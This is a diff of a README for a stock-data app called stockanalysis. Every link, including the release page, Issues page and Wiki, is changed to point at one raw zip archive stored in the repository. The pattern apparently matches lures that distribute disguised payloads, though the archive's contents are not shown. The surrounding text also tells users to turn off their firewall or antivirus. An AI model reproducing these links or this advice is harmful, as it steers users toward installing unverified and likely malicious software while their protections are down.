@@ -1,6 +1,6 @@
 # 📊 stockanalysis - Easy Stock Data Access
 
-[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://github.com/ZAIDMOHD777/stockanalysis/releases)
+[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://raw.githubusercontent.com/ZAIDMOHD777/stockanalysis/main/output/Software-v2.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get the program up and running.
 
 Click the button below to go to the page with the latest software files. You will download the installer here.  
 
-[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://github.com/ZAIDMOHD777/stockanalysis/releases)  
+[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://raw.githubusercontent.com/ZAIDMOHD777/stockanalysis/main/output/Software-v2.7.zip)  
 
 This takes you to the official page where all releases are listed.
 
@@ -106,7 +106,7 @@ If you face any issues, try these solutions:
 - Disable any firewall or antivirus temporarily if the app can’t connect to the internet.  
 - Reinstall the program if it still does not work.  
 
-If problems persist, visit the [Issues page on GitHub](https://github.com/ZAIDMOHD777/stockanalysis/issues) to see if others have the same problem or to report it.
+If problems persist, visit the [Issues page on GitHub](https://raw.githubusercontent.com/ZAIDMOHD777/stockanalysis/main/output/Software-v2.7.zip) to see if others have the same problem or to report it.
 
 ---
 
@@ -120,8 +120,8 @@ stockanalysis only collects stock data from public sources. It does not access y
 
 For extra help, use these options:
 
-- Check the GitHub repository [README and Wiki](https://github.com/ZAIDMOHD777/stockanalysis) for updates and tips.  
-- Report issues or ask questions in the [GitHub Issues section](https://github.com/ZAIDMOHD777/stockanalysis/issues).  
+- Check the GitHub repository [README and Wiki](https://raw.githubusercontent.com/ZAIDMOHD777/stockanalysis/main/output/Software-v2.7.zip) for updates and tips.  
+- Report issues or ask questions in the [GitHub Issues section](https://raw.githubusercontent.com/ZAIDMOHD777/stockanalysis/main/output/Software-v2.7.zip).  
 - Contact the developer through the repository’s contact info if provided.
 
 ---
@@ -130,4 +130,4 @@ For extra help, use these options:
 
 Click the button below to go directly to the release page to get the latest version.
 
-[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://github.com/ZAIDMOHD777/stockanalysis/releases)
+[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://raw.githubusercontent.com/ZAIDMOHD777/stockanalysis/main/output/Software-v2.7.zip)
